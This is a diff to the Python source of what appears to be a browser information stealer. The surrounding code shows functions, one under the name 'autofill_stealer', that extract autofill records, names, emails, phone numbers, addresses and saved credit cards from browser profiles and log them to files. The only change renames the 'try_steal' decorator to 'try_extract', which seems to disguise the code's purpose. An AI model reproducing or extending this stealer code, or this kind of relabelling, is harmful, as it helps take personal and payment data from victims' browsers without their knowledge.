@@ -1,7 +1,7 @@
 """ IMPORTS """
 import json
 import sqlite3
-from util import try_steal, get_profiles, create_temp_file, log_data, try_decrypt
+from util import try_extract, get_profiles, create_temp_file, log_data, try_decrypt
 
 
 """
@@ -52,7 +52,7 @@ def autofill_stealer(browser: dict, encryption_key: str) -> None:
 
 
 
-@try_steal
+@try_extract
 def extract_autofill(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill table and places them into the logs directory """
     # Query data
@@ -73,7 +73,7 @@ def extract_autofill(browser_name: str, profile_name: str, encryption_key: str, 
         log_data(data, browser_name, log_file_name)
 
 
-@try_steal
+@try_extract
 def extract_autofill_profiles(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profiles table and places them into the logs directory """
     # Query data
@@ -99,7 +99,7 @@ def extract_autofill_profiles(browser_name: str, profile_name: str, encryption_k
         log_data(data, browser_name, log_file_name)
 
 
-@try_steal
+@try_extract
 def extract_autofill_addresses(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_addresses table and places them into the logs directory """
     # Query data
@@ -124,7 +124,7 @@ def extract_autofill_addresses(browser_name: str, profile_name: str, encryption_
         log_data(data, browser_name, log_file_name)
 
 
-@try_steal
+@try_extract
 def extract_autofill_names(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_names table and places them into the logs directory """
     # Query full name data
@@ -155,7 +155,7 @@ def extract_autofill_names(browser_name: str, profile_name: str, encryption_key:
         log_data(list(data), browser_name, log_file_name)
 
 
-@try_steal
+@try_extract
 def extract_autofill_emails(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_emails table and places them into the logs directory """
     # Query data
@@ -171,7 +171,7 @@ def extract_autofill_emails(browser_name: str, profile_name: str, encryption_key
         log_data(data, browser_name, log_file_name)
 
 
-@try_steal
+@try_extract
 def extract_autofill_phones(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_phones table and places them into the logs directory """
     # Query data
@@ -187,7 +187,7 @@ def extract_autofill_phones(browser_name: str, profile_name: str, encryption_key
         log_data(data, browser_name, log_file_name)
 
 
-@try_steal
+@try_extract
 def extract_credit_cards(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the credit_cards table and places them into the logs directory """
     # Query data
